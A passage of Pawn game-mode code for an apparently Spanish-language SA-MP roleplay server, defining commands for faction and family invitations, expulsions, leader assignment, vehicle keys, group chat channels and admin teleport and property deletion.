			return Error(playerid,"¡Jugador desconectado!");

		if(!ProxDetectorS(3.0, playerid, params[0]))
			return Error(playerid, "Debes estar más cerca de ese jugador!");
			
		if(!strcmp(params[1],"faccion",true))
		{
		    if(!ID_PFac)
				return Error(playerid,"¡No eres lider de ninguna facción!");
				
			if(InfoJugador[params[0]][jLider])
				return Error(playerid,"¡Ese jugador es lider!");
				
			if(InfoJugador[params[0]][jMiembro])
				return Error(playerid,"¡Ese jugador ya es miembro de una facción!");

			if(GetPVarInt(params[0], "INVITACION_FACCION"))
			    return Error(playerid, "¡Ese jugador, ya tiene una invitación pendiente!");
			    
			if(ID_Familia(params[0]))
			    return Error(playerid, "Ese jugador pertenece a una familia.");

			SetPVarInt(params[0], "INVITACION_FACCION", ID_PFac);
			
			MensajeF(params[0], C_VERDE, "%s "#CBLANCO"te invitó a la facción "#CINFO"%s. "#CBLANCO"Puedes "#CINFO"/aceptar faccion "#CBLANCO"o "#CINFO"/rechazar faccion",
			                    NombreJugador_(playerid),
			                    NombreFaccion(ID_PFac));
			                    
			MensajeF(playerid, -1, "Invitaste a "#CVERDE"%s "#CBLANCO"a tu facción. Ahora, espera su respuesta.", NombreJugador_(params[0]));
			return 1;
		}
		else if(!strcmp(params[1],"familia",true))
		{
		    if(!ID_PFam)
				return Error(playerid,"¡No eres lider de ninguna familia!");
				
			if(InfoJugador[params[0]][jLiderFam])
				return Error(playerid,"¡Ese jugador es lider!");
				
			if(InfoJugador[params[0]][jMiembroFam])
				return Error(playerid,"¡Ese jugador ya es miembro de una familia!");

			if(GetPVarInt(params[0], "INVITACION_FAMILIA"))
			    return Error(playerid, "¡Ese jugador, ya tiene una invitación pendiente!");

			if(ID_Faccion(params[0]))
			    return Error(playerid, "Ese jugador pertenece a una facción.");

			SetPVarInt(params[0], "INVITACION_FAMILIA", ID_PFam);

			MensajeF(params[0], C_VERDE, "%s "#CBLANCO"te invitó a la familia "#CINFO"%s. "#CBLANCO"Puedes "#CINFO"/aceptar familia "#CBLANCO"o "#CINFO"/rechazar familia",
			                    NombreJugador_(playerid),
			                    InfoFamilia[ID_PFam][fNombre]);

			MensajeF(playerid, -1, "Invitaste a "#CVERDE"%s "#CBLANCO"a tu familia. Ahora, espera su respuesta.", NombreJugador_(params[0]));
			return 1;
		}
		return ParamsINC(playerid,"/invitar [id/nombre] [faccion/famila]");
	}

	CMD:quitarllave(playerid, params[])
	{
	    // -===========================-
	    if(!InfoJugador[playerid][jLider]) return Error(playerid, "¡No sos lider de facción!");
	    if(sscanf(params, "ui", params[0], params[1])) return ParamsINC(playerid,"/quitarllave [ID/NOMBRE] [Nº DE LLAVE]");
	    if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
	    if(InfoJugador[playerid][jLider] != ID_Faccion(params[0])) return Error(playerid, "¡Esa persona no es de tu facción!");
	    if(!Bit_Get(Llave_veh[params[0]], params[1])) return Error(playerid,"¡Ese jugador no tiene esa llave!");
	    if(InfoJugador[params[0]][jLider] == InfoJugador[playerid][jLider]) return Error(playerid,"¡No le puedes quitar llaves a un lider/sublider!");
		if(!ProxDetectorS(2.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está muy lejos tuyo!");
		if(Veh[params[1]][vFaccion] != InfoJugador[playerid][jLider]) return Error(playerid, "¡Esa llave no es de tu facción!");
	    // -===========================-

	    Bit_Set(Llave_veh[params[0]], params[1], false);

	    new
	        Rol[70];

		A_Format(Rol, "le quita a %s la llave nº %d", NombreJugador(params[0]), params[1]);
		AutoRol(playerid, Rol);
		return 1;
	}

stock GetNearKP(playerid)
{
	new
	    Float: Old_Dist = 1.3,
		kp_id = -1;

	foreach(KeyPads, i)
	{
	    new
	        Float: Dist = GetPlayerDistanceFromPoint(playerid, KeyPadInfo[i][kpPosx],
         												KeyPadInfo[i][kpPosy],
                     									KeyPadInfo[i][kpPosz]);

		if(Dist > Old_Dist) continue;
		if(Dist < Old_Dist)
		{
			Old_Dist = Dist;
			kp_id = i;
		}
	}
	return kp_id;
}

stock VehMasCercano(playerid, bool:Llave = false, Float:Radi_max = 30.0)
{
	new
	    Vehicle = INVALID_VEHICLE_ID,
		Float:Old_Dist = Radi_max;

	if(Llave)
	{
		foreach(Vehicle,i)
		{
			if(GetVehicleVirtualWorld(i) != GetPlayerVirtualWorld(playerid)) continue;

			if(TieneLlaveVeh(playerid, i))
			{
				new
					Float: PosJ[3];

				GetPlayerPos(playerid, PosJ[0], PosJ[1], PosJ[2]);

				new
					Float:Dist = GetVehicleDistanceFromPoint(i, PosJ[0], PosJ[1], PosJ[2]);

				if(Dist > Radi_max) continue;
				if(Dist < Old_Dist)
				{
					Old_Dist = Dist;
					Vehicle = i;
				}
			}
		}
	}
	else
	{
		foreach(Vehicle,i)
		{
			if(GetVehicleVirtualWorld(i) != GetPlayerVirtualWorld(playerid)) continue;

			new
  				Float: PosJ[3];

			GetPlayerPos(playerid, PosJ[0], PosJ[1], PosJ[2]);

			new
	    		Float:Dist = GetVehicleDistanceFromPoint(i, PosJ[0], PosJ[1], PosJ[2]);

			if(Dist < Old_Dist)
			{
	    		Old_Dist = Dist;
	    		Vehicle = i;
			}
		}
	}
	return Vehicle;
}

	stock IsValidFac(F_ID)
	    return (0 < F_ID < MAX_FACCIONES);

	stock IsValidFam(F_ID)
	    return isnull(InfoFamilia[F_ID][fNombre]) ? false : true;

	CMD:expulsarliderfac(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;

	    new
			F_ID,
			str[40],
			NombreLider[MAX_PLAYER_NAME];

		if(sscanf(params, "i", F_ID)) return ParamsINC(playerid, "/expulsarliderfac [ID Fac]");
		if(!IsValidFac(F_ID)) return Error(playerid, "¡Esa facción no existe!");
		if(isnull(InfoFaccion[F_ID][fLider])) return Error(playerid, "¡Esa facción no tiene lider!");
		
		alm(NombreLider, InfoFaccion[F_ID][fLider]);

		new
		    LeaderID = INVALID_PLAYER_ID;
		    
		foreach(Player, i)
		{
		    if(!strcmp(pName(i), NombreLider))
		    {
		        LeaderID = i;
		        break;
			}
		}
		if(LeaderID != INVALID_PLAYER_ID)
		{
			InfoJugador[LeaderID][jLider] = 0;
			InfoJugador[LeaderID][jMiembro] = 0;
			ActualizarCuenta(LeaderID);
			MensajeF(LeaderID, -1, "El administrador "#CROJO"%s "#CBLANCO"te quitó la facción "#CVERDE"%s", NombreJugador_(playerid), NombreFaccion(F_ID) );
		}
		else
		{
			A_Format(str, "Usuarios/%s.ini", NombreLider);

		    new
		        INI:Arch = INI_Open(str);

			INI_SetTag(Arch, "data");
			INI_WriteInt(Arch, "Lider", 0);
			INI_WriteInt(Arch, "Miembro", 0);
			INI_Close(Arch);
		}
		MensajeF(playerid, -1, "Se le quitó la facción "#CVERDE"%s "#CBLANCO"a "#CROJO"%s.", NombreFaccion(F_ID), NombreLider );
		alm(InfoFaccion[F_ID][fLider], "");
		ActualizarFacciones();
		return 1;
	}

	CMD:editarliderfac(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
	    new
			NombreLider[24],
			F_ID;
			
		if(sscanf(params, "p< >is[24]", F_ID, NombreLider)) return ParamsINC(playerid, "/editarliderfac [ID Fac] [Nombre_Apellido lider]");
		if(!IsValidFac(F_ID)) return Error(playerid, "¡Esa facción no existe!");
		
		new
		    str[40],
			LeaderID = INVALID_PLAYER_ID;

		A_Format(str, "Usuarios/%s.ini", NombreLider);
		
		if(!fexist(str))
		    return Error(playerid, "Ese nombre no está registrado en el servidor.");
		    
		foreach(Player, i)
		{
		    if(!strcmp(pName(i), NombreLider))
		    {
		        LeaderID = i;
		        break;
			}
		}
		
		if(!isnull(InfoFaccion[F_ID][fLider]))
		{
		    new
		        ActualLeaderID = INVALID_PLAYER_ID,
		        ActualLeaderName[MAX_PLAYER_NAME],
				str2[40];
		        
			alm(ActualLeaderName, InfoFaccion[F_ID][fLider]);
			A_Format(str, "Usuarios/%s.ini", ActualLeaderName);

			foreach(Player, i)
			{
			    if(!strcmp(pName(i), ActualLeaderName))
			    {
                    ActualLeaderID = i;
                    break;
				}
			}
			if(ActualLeaderID != INVALID_PLAYER_ID)
			{
				InfoJugador[ActualLeaderID][jLider] = 0;
				InfoJugador[ActualLeaderID][jMiembro] = 0;
				ActualizarCuenta(ActualLeaderID);
				MensajeF(ActualLeaderID, -1, "El administrador "#CROJO"%s "#CBLANCO"te expulsó de la facción.", NombreJugador_(playerid));
			}
		    else
			{
				new
			        INI:Arch = INI_Open(str2);

				INI_SetTag(Arch, "data");
				INI_WriteInt(Arch, "Lider", 0);
				INI_WriteInt(Arch, "Miembro", 0);
				INI_Close(Arch);
			}
			MensajeF(playerid, -1, "Ya habia un líder "#CINFO"(%s). "#CBLANCO"Su cargo fue removido.", ActualLeaderName);
		}
		if(LeaderID != INVALID_PLAYER_ID)
		{
			InfoJugador[LeaderID][jLider] = F_ID;
			InfoJugador[LeaderID][jMiembro] = 0;
			ActualizarCuenta(LeaderID);
			MensajeF(LeaderID, -1, "El administrador "#CROJO"%s "#CBLANCO"te fijó como lider de la facción "#CVERDE"%s", NombreJugador_(playerid), NombreFaccion(F_ID) );
		}
		else
		{
		    new
		        INI:Arch = INI_Open(str);
		        
			INI_SetTag(Arch, "data");
			INI_WriteInt(Arch, "Lider", F_ID);
			INI_WriteInt(Arch, "Miembro", 0);
			INI_Close(Arch);
		}
		MensajeF(playerid, -1, "Fijaste a "#CINFO"%s "#CBLANCO"como líder de la facción "#CVERDE"%s(%d)", NombreLider, NombreFaccion(F_ID), F_ID);
		alm(InfoFaccion[F_ID][fLider], NombreLider);
		MensajeF(playerid, -1, "Utiliza "#CINFO"/darllavescuenta %s "#CBLANCO"para entregarle las llaves a "#CVERDE"%s", NombreLider, NombreLider);
		ActualizarFacciones();
		return 1;
	}
	
	CMD:darllavescuenta(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;

	    new
			NombreLider[24],
			F_ID;

		if(sscanf(params, "p< >is[24]", F_ID, NombreLider)) return ParamsINC(playerid, "/darllavescuenta [ID Fac] [Nombre_Apellido lider]");
		if(!IsValidFac(F_ID)) return Error(playerid, "¡Esa facción no existe!");
		
		foreach(Player, i)
		    if(!strcmp(NombreLider, pName(i)))
		        return Error(playerid, "El jugador ya está conectado, utiliza /darllaves [id]");
		        
		DarLlavesCuenta(NombreLider, F_ID);
		MensajeF(playerid, -1, "Las llaves fueron entregadas a "#CVERDE"%s", NombreLider);
		return 1;
	}
	
	CMD:quitarllavescuenta(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
	    if(isnull(params) || strlen(params) >= MAX_PLAYER_NAME) return ParamsINC(playerid, "/quitarllavescuenta [Nombre_Apellido]");
		SacarLlavesCuenta(params);
		MensajeF(playerid, -1, "Le quitaste a "#CINFO"%s "#CBLANCO"todas las llaves de los coches de su facción.", params);
		return 1;
	}
	
	CMD:darllaves(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/darllaves [id]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado");
		if(!InfoJugador[params[0]][jLider]) return Error(playerid, "Ese jugador no es lider de facción.");
		DarLlavesFaccion(params[0]);
		MensajeF(playerid, -1, "Le diste a "#CINFO"%s "#CBLANCO"todas las llaves de los coches de su facción.", NombreJugador_(params[0]));
		return 1;
	}

	CMD:quitarllaves(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/quitarllaves [id]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado");
		SacarLlavesFaccion(params[0]);
		MensajeF(playerid, -1, "Le quitaste a "#CINFO"%s "#CBLANCO"todas las llaves de los coches de su facción.", NombreJugador_(params[0]));
		return 1;
	}

	CMD:expulsarliderfam(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;

	    new
			F_ID,
			str[40],
			NombreLider[MAX_PLAYER_NAME];

		if(sscanf(params, "i", F_ID)) return ParamsINC(playerid, "/expulsarliderfam [ID Fac]");
		if(!IsValidFam(F_ID)) return Error(playerid, "¡Esa familia no existe!");
		if(isnull(InfoFamilia[F_ID][fLider])) return Error(playerid, "¡Esa familia no tiene lider!");

		alm(NombreLider, InfoFamilia[F_ID][fLider]);

		new
		    LeaderID = INVALID_PLAYER_ID;

		foreach(Player, i)
		{
		    if(!strcmp(pName(i), NombreLider))
		    {
		        LeaderID = i;
		        break;
			}
		}
		if(LeaderID != INVALID_PLAYER_ID)
		{
			InfoJugador[LeaderID][jLiderFam] = 0;
			InfoJugador[LeaderID][jMiembroFam] = 0;
			ActualizarCuenta(LeaderID);
			MensajeF(LeaderID, -1, "El administrador "#CROJO"%s "#CBLANCO"te quitó la familia "#CVERDE"%s", NombreJugador_(playerid), InfoFamilia[F_ID][fNombre] );
		}
		else
		{
			A_Format(str, "Usuarios/%s.ini", NombreLider);

		    new
		        INI:Arch = INI_Open(str);

			INI_SetTag(Arch, "data");
			INI_WriteInt(Arch, "LiderFam", 0);
			INI_WriteInt(Arch, "MiembroFam", 0);
			INI_Close(Arch);
		}
		MensajeF(playerid, -1, "Se le quitó la familia "#CVERDE"%s "#CBLANCO"a "#CROJO"%s.", InfoFamilia[F_ID][fNombre], NombreLider );
		alm(InfoFamilia[F_ID][fLider], "");
		ActualizarFamilia(F_ID);
		return 1;
	}

	
	CMD:editarliderfam(playerid, params[])
	{
	    if(Staff(playerid,SubDueno)) return 1;
	    new
			NombreLider[24],
			F_ID;

		if(sscanf(params, "p< >is[24]", F_ID, NombreLider)) return ParamsINC(playerid, "/editarliderfam [ID Fam] [Nombre_Apellido lider]");
		if(!IsValidFam(F_ID)) return Error(playerid, "¡Esa familia no existe!");

		new
		    str[40],
			LeaderID = INVALID_PLAYER_ID;

		A_Format(str, "Usuarios/%s.ini", NombreLider);

		if(!fexist(str))
		    return Error(playerid, "Ese nombre no está registrado en el servidor.");

		foreach(Player, i)
		{
		    if(!strcmp(pName(i), NombreLider))
		    {
		        LeaderID = i;
		        break;
			}
		}

		if(!isnull(InfoFamilia[F_ID][fLider]))
		{
		    new
		        ActualLeaderID = INVALID_PLAYER_ID,
		        ActualLeaderName[MAX_PLAYER_NAME],
				str2[40];

			alm(ActualLeaderName, InfoFamilia[F_ID][fLider]);
			A_Format(str, "Usuarios/%s.ini", ActualLeaderName);

			foreach(Player, i)
			{
			    if(!strcmp(pName(i), ActualLeaderName))
			    {
                    ActualLeaderID = i;
                    break;
				}
			}
			if(ActualLeaderID != INVALID_PLAYER_ID)
			{
				InfoJugador[ActualLeaderID][jLiderFam] = 0;
				InfoJugador[ActualLeaderID][jMiembroFam] = 0;
				ActualizarCuenta(ActualLeaderID);
				MensajeF(ActualLeaderID, -1, "El administrador "#CROJO"%s "#CBLANCO"te expulsó de la familia.", NombreJugador_(playerid));
			}
		    else
			{
				new
			        INI:Arch = INI_Open(str2);

				INI_SetTag(Arch, "data");
				INI_WriteInt(Arch, "LiderFam", 0);
				INI_WriteInt(Arch, "MiembroFam", 0);
				INI_Close(Arch);
			}
			MensajeF(playerid, -1, "Ya habia un líder "#CINFO"(%s). "#CBLANCO"Su cargo fue removido.", ActualLeaderName);
		}
		if(LeaderID != INVALID_PLAYER_ID)
		{
			InfoJugador[LeaderID][jLiderFam] = F_ID;
			InfoJugador[LeaderID][jMiembroFam] = 0;
			ActualizarCuenta(LeaderID);
			MensajeF(LeaderID, -1, "El administrador "#CROJO"%s "#CBLANCO"te fijó como lider de la familia "#CVERDE"%s", NombreJugador_(playerid), InfoFamilia[F_ID][fNombre] );
		}
		else
		{
		    new
		        INI:Arch = INI_Open(str);

			INI_SetTag(Arch, "data");
			INI_WriteInt(Arch, "LiderFam", F_ID);
			INI_WriteInt(Arch, "MiembroFam", 0);
			INI_Close(Arch);
		}
		MensajeF(playerid, -1, "Fijaste a "#CINFO"%s "#CBLANCO"como líder de la familia "#CVERDE"%s(%d)", NombreLider, InfoFamilia[F_ID][fNombre], F_ID);
		alm(InfoFamilia[F_ID][fLider], NombreLider);
		ActualizarFamilia(F_ID);
		return 1;
	}

	CMD:expulsar(playerid,params[])
	{
	    new ID_PFac = InfoJugador[playerid][jLider],
	    	ID_PFam = InfoJugador[playerid][jLiderFam];
		if(!ID_PFac && !ID_PFam) return Error(playerid,"¡No eres lider de ninguna familia/facción!");
		if(sscanf(params,"us[20]",params[0],params[1])) return ParamsINC(playerid,"/expulsar [id/nombre] <faccion - famila>");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		if(!strcmp(params[1],"faccion",true))
		{
		    if(!ID_PFac) return Error(playerid,"¡No eres lider de ninguna facción!");
			if(InfoJugador[params[0]][jLider]) return Error(playerid,"¡Ese jugador es lider!");
			if(!InfoJugador[params[0]][jMiembro]) return Error(playerid,"¡Ese jugador no pertenece a tu facción!");
			if( InfoJugador[params[0]][jMiembro] != ID_PFac) return Error(playerid,"¡Ese jugador no pertenece a tu facción!");
			new StrFac[160];
			A_Format(StrFac,""#CVERDE"[Facción] "#CINFO"%s "#CBLANCO"expulsó a "#CINFO"%s "#CBLANCO"de la facción.",NombreJugador_(playerid),NombreJugador_(params[0]));
			MensajeFaccion(ID_PFac,StrFac);
			SacarLlavesFaccion(params[0]);
			InfoJugador[params[0]][jMiembro] = 0;
			InfoJugador[params[0]][jRango] = 1;
			//RemoveFromFac(pName(params[0]), ID_PFac);
			return 1;
		}
		else if(!strcmp(params[1],"familia",true))
		{
		    if(!ID_PFam) return Error(playerid,"¡No eres lider de ninguna familia!");
			if(InfoJugador[params[0]][jLiderFam]) return Error(playerid,"¡Ese jugador es lider!");
			if(!InfoJugador[params[0]][jMiembroFam]) return Error(playerid,"¡Ese jugador no pertenece a tu familia!");
			if( InfoJugador[params[0]][jMiembroFam] != ID_PFam) return Error(playerid,"¡Ese jugador no pertenece a tu familia!");
			new StrFac[160];
			A_Format(StrFac,""#CVERDE"[Familia] "#CINFO"%s "#CBLANCO"expulsó a "#CINFO"%s "#CBLANCO"de la familia.",NombreJugador_(playerid),NombreJugador_(params[0]));
			MensajeFamilia(ID_PFam,StrFac);
			InfoJugador[params[0]][jMiembroFam] = 0;
			InfoJugador[params[0]][jRangoFam] = 1;
			return 1;
		}
		return ParamsINC(playerid,"/expulsar [id/nombre] <faccion - famila>");
	}

//  TEST

/*
CMD:keycontrol(playerid, params[])
{
	new Float: x, Float: y, Float: z;

	GetPlayerPos(playerid, x, y, z);

	z += 0.47;

	new
	    KP = CreateDynamicObject(OBJ_KeyPad, x+1.0, y, z, 0, 0, 0);

	EditDynamicObject(playerid, KP);
	SetPVarInt(playerid, "EditandoKP", true);
	return 1;
}*/

	CMD:fam(playerid,params[])
	{
	    if(!InfoJugador[playerid][jLiderFam] && !InfoJugador[playerid][jMiembroFam]) return Error(playerid,"¡No tienes ninguna familia!");
	    if(isnull(params)) return ParamsINC(playerid,"/fam [Texto]");
	    
		new
			str[132 + MAX_PLAYER_NAME + (8*3)],
			i = ID_Familia(playerid);
			
		if(InfoJugador[playerid][jLiderFam])
		{
			format(str,sizeof(str),"(( [Familia] Lider %s: "#CAZULLINDO"%s "#CNARANJA2"))",NombreJugador_(playerid),params[0]);
			foreach(Player, p)
			{
			    if(ID_Familia(p) == i && !InfoJugador[p][jBlockFam])
			    {
			    	Mensaje(p, C_NARANJA2, str);
				}
			}
		}
		else
		{
		    new
		        rank[20];
		    switch(InfoJugador[playerid][jRangoFam])
		    {
		        case 1: alm(rank, InfoFamilia[i][fRango_1]);
		        case 2: alm(rank, InfoFamilia[i][fRango_2]);
		        case 3: alm(rank, InfoFamilia[i][fRango_3]);
		        case 4: alm(rank, InfoFamilia[i][fRango_4]);
		        case 5: alm(rank, InfoFamilia[i][fRango_5]);
			}
			format(str,sizeof(str),"(( [Familia] %s %s: "#CBLANCO"%s "#CNARANJA2"))",rank,NombreJugador_(playerid),params);
			foreach(Player, p)
			{
			    if(ID_Familia(p) == i && !InfoJugador[p][jBlockFam])
			    {
			    	Mensaje(p, C_NARANJA2, str);
				}
			}
		}
		return 1;
	}

	CMD:fac(playerid, params[])
	{
	    if(!InfoJugador[playerid][jLider] && !InfoJugador[playerid][jMiembro]) return Error(playerid,"¡No tienes ninguna facción!");
		if(isnull(params)) return ParamsINC(playerid, "/fac [Texto]");
		new
		    Str[140];
		    
		if(InfoJugador[playerid][jLider])
		{
			A_Format(Str, "(( [Facción] %s %s: "#CAZULLINDO"%s "#CNARANJA2"))", InfoLider[ID_Faccion(playerid)], NombreJugador_(playerid), params);
			foreach(Player, p)
			{
			    if(ID_Faccion(p) == InfoJugador[playerid][jLider] && !InfoJugador[p][jBlockFac])
			    {
			    	Mensaje(p, C_NARANJA2, Str);
				}
			}
		}
		else
		{
			A_Format(Str, "(( [Facción] %s %s: "#CBLANCO"%s "#CNARANJA2"))", InfoRango[ID_Faccion(playerid)][InfoJugador[playerid][jRango]], NombreJugador_(playerid), params);
			foreach(Player, p)
			{
			    if(ID_Faccion(p) == InfoJugador[playerid][jMiembro] && !InfoJugador[p][jBlockFac])
			    {
			    	Mensaje(p, C_NARANJA2, Str);
				}
			}
		}
		return 1;
	}

	CMD:r(playerid,params[])
	{
	    if(isnull(params)) return ParamsINC(playerid,"/r [Texto]");
		if( !ID_Faccion(playerid) ) return Error(playerid,"¡No perteneces a ninguna facción!");
		new Str[130];
		A_Format(Str,"> "#CVIOLETA"(RADIO) "#CBLANCO"%s: %s",NombreJugador(playerid),params);
		if(InfoJugador[playerid][jMiembro]) MensajeFaccion(InfoJugador[playerid][jMiembro],Str);
		else MensajeFaccion(InfoJugador[playerid][jLider],Str);
		A_Format(Str,"%s (radio) : %s",NombreJugador(playerid),params);
		ProxDetector(5,playerid,Str,-1,Hablar,Hablar2,Hablar3,Hablar4);
		return 1;
	}

	CMD:dep(playerid,params[])
	{
	    if(isnull(params)) return ParamsINC(playerid,"/dep [TEXTO]");
		if( !EsLSPD(playerid) &&
			!EsMilitar(playerid) &&
			!EsMedico(playerid) &&
			!EsDelGobierno(playerid)) return Error(playerid,"¡No perteneces a una organización oficial!");
		new Str[140];
		if(EsLSPD(playerid)) A_Format(Str,"> "#CGRIS"(DEPTO) "#CBLANCO"Policía %s: %s",NombreJugador(playerid),params);
		else if(EsMilitar(playerid)) A_Format(Str,"> "#CGRIS"(DEPTO) "#CBLANCO"Militar %s: %s",NombreJugador(playerid),params);
		else if(EsMedico(playerid)) A_Format(Str,"> "#CGRIS"(DEPTO) "#CBLANCO"Médico %s: %s",NombreJugador(playerid),params);
		else if(EsDelGobierno(playerid)) A_Format(Str,"> "#CGRIS"(DEPTO) "#CBLANCO"Político %s: %s",NombreJugador(playerid),params);
		MensajeFaccion(IDLSPD,Str);
		MensajeFaccion(IDLSEM,Str);
		MensajeFaccion(IDLSMD,Str);
		MensajeFaccion(IDGOBIERNO,Str);
		return 1;
	}

	CMD:idnegocio(playerid,params[])
	{
 		foreach(Negocios,n)
	 	{
			if(IsPlayerInRangeOfPoint(playerid,2,InfoNegocio[n][nEntrada_x],InfoNegocio[n][nEntrada_y],InfoNegocio[n][nEntrada_z]))
  			{
  			    MensajeF(playerid, -1, "La ID de este negocio es: "#CPOSITIVO"%d",n);
				return 1;
			}
		}
		return 1;
	}

	CMD:idcasa(playerid,params[])
	{
 		foreach(Casas,c)
	 	{
			if(IsPlayerInRangeOfPoint(playerid,2,InfoCasa[c][cEntrada_x],InfoCasa[c][cEntrada_y],InfoCasa[c][cEntrada_z]))
  			{
  			    MensajeF(playerid, -1, "La ID de esta casa es: "#CPOSITIVO"%d",c);
  			    return 1;
			}
		}
		return Error(playerid,"¡No estás en ningun casa! Dirigete a la entrada de alguno y usa este comando.");
	}

	CMD:ircasa(playerid,params[])
	{
		Para_Admin_Servicio
		if(Staff(playerid,Moderador)) return 1;
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/ircasa [ID CASA]");
  		if(InfoCasa[params[0]][cVW] == 0 && InfoCasa[params[0]][cInt] == 0) return Error(playerid,"¡Esa casa no existe! (ID INCORRECTA)");
		SetPlayerPos(playerid,InfoCasa[params[0]][cEntrada_x],InfoCasa[params[0]][cEntrada_y],InfoCasa[params[0]][cEntrada_z]);
		Mensaje(playerid,-1,"> Teletransportado correctamente");
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		return 1;
	}

	CMD:irnegocio(playerid,params[])
	{
		Para_Admin_Servicio
		if(Staff(playerid,Moderador)) return 1;
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/irnegocio [ID Negocio]");
  		if(InfoNegocio[params[0]][nVW] == 0 && InfoNegocio[params[0]][nInt] == 0) return Error(playerid,"¡Ese negocio no existe! (ID INCORRECTA)");
		SetPlayerPos(playerid,InfoNegocio[params[0]][nEntrada_x],InfoNegocio[params[0]][nEntrada_y],InfoNegocio[params[0]][nEntrada_z]);
		Mensaje(playerid,-1,"> Teletransportado correctamente");
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		return 1;
	}

	CMD:irint(playerid,params[])
	{
		Para_Admin_Servicio
		if(Staff(playerid,SubDueno)) return 1;
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/irint [ID INTERIOR CASA]");
		SetPlayerPos(playerid,InfoInteriorCasa[params[0]][iPos_x],InfoInteriorCasa[params[0]][iPos_y],InfoInteriorCasa[params[0]][iPos_z]);
		SetPlayerInterior(playerid,InfoInteriorCasa[params[0]][iInt]);
		SetPlayerVirtualWorld(playerid,0);
		Mensaje(playerid,-1,"> Teletransportado correctamente");
		return 1;
	}

	CMD:borrarnegocio(playerid,params[])
	{
		Para_Admin_Servicio
		if(Staff(playerid,SubDueno)) return 1;
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/borrarnegocio [ID NEGOCIO]");
  		if(InfoNegocio[params[0]][nVW] == 0 && InfoNegocio[params[0]][nInt] == 0) return Error(playerid,"¡Ese negocio no existe! (ID INCORRECTA)");
		new str[45],str1[18];
		format(str,sizeof(str),"Negocio borrado correctamente "#CPOSITIVO"(ID %d)",params[0]);
		Mensaje(playerid,-1,str);
		DestroyDynamic3DTextLabel(Negocio[params[0]]);
		format(str1,sizeof(str1),"Negocios/%d.ini",params[0]);
		InfoNegocio[params[0]][nEntrada_x] = 0;
		InfoNegocio[params[0]][nEntrada_y] = 0;
		InfoNegocio[params[0]][nEntrada_z] = 0;
		InfoNegocio[params[0]][nSalida_x] = 0;
		InfoNegocio[params[0]][nSalida_y] = 0;
		InfoNegocio[params[0]][nSalida_z] = 0;
		InfoNegocio[params[0]][nComprado] = false;
		InfoNegocio[params[0]][nPrecioEntrada] = 0;
		InfoNegocio[params[0]][nPrecio] = 0;
		InfoNegocio[params[0]][nVW] = 0;
		InfoNegocio[params[0]][nInt] = 0;
		InfoNegocio[params[0]][nTipo] = 0;
		Iter_Remove(Negocios,params[0]);
		--Total_Negocios_Creados;
		fremove(str1);
		return 1;
	}

	CMD:pvar_form_me(playerid, params[])
	{
		if(Staff(playerid,Dueno)) return 1;

		new
		    str[30],
			int_;

		unformat(params,"p< >s[20]d", str, int_);

		SetPVarInt(playerid, str, int_);
		return (1);
	}

	CMD:borrarcasa(playerid,params[])
	{
		Para_Admin_Servicio
		if(Staff(playerid,SubDueno)) return 1;
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/borrarcasa [ID Casa]");
  		if(InfoCasa[params[0]][cVW] == 0 && InfoCasa[params[0]][cInt] == 0) return Error(playerid,"¡Ese negocio no existe! (ID INCORRECTA)");
		new str[45],str1[18];
		format(str,sizeof(str),"Casa borrada correctamente "#CPOSITIVO"(ID %d)",params[0]);
		Mensaje(playerid,-1,str);
		DestroyDynamic3DTextLabel(Casa[params[0]]);
		format(str1,sizeof(str1),"Casas/%d.ini",params[0]);
		InfoCasa[params[0]][cEntrada_x] = 0;
		InfoCasa[params[0]][cEntrada_y] = 0;
		InfoCasa[params[0]][cEntrada_z] = 0;
		InfoCasa[params[0]][cSalida_x] = 0;
		InfoCasa[params[0]][cSalida_y] = 0;
		InfoCasa[params[0]][cSalida_z] = 0;
		InfoCasa[params[0]][cComprada] = false;
		InfoCasa[params[0]][cPrecio] = 0;
		InfoCasa[params[0]][cInt] = 0;
		InfoCasa[params[0]][cVW] = 0;
		Iter_Remove(Casas,params[0]);
		--Total_Casas_Creadas;
		fremove(str1);
		return 1;
	}

	CMD:rechazar(playerid, params[])
	{
	    if(isnull(params)) return ParamsINC(playerid, "/rechazar [oferta/faccion/familia]");
	    if(!strcmp(params, "oferta", true))
	    {
		    if(GetPVarInt(playerid, "OFERTA_VEHID"))
		    {
		        new
		            ID = GetPVarInt(playerid, "OFERTA_POR");

				MensajeF(ID, -1, "El jugador "#CINFO"%s "#CBLANCO"decidio "#CROJO"rechazar "#CBLANCO"tu oferta.", NombreJugador(playerid) );
				MensajeF(playerid, -1, "Rechazaste la oferta de "#CINFO"%s.", NombreJugador(ID));
				// -==============-
				DeletePVar(playerid, "OFERTA_POR"   );
	   			DeletePVar(playerid, "OFERTA_PRECIO");
		        DeletePVar(playerid, "OFERTA_VEHID" );
				// -==============-
				return 1;
			}
		    if(GetPVarInt(playerid, "OFERTA_HOUSEID"))
		    {
		        new
		            ID = GetPVarInt(playerid, "OFERTA_POR");

				MensajeF(ID, -1, "El jugador "#CINFO"%s "#CBLANCO"decidio "#CROJO"rechazar "#CBLANCO"tu oferta.", NombreJugador(playerid) );
				MensajeF(playerid, -1, "Rechazaste la oferta de "#CINFO"%s.", NombreJugador(ID));
				// -==============-
				DeletePVar(playerid, "OFERTA_POR"     );
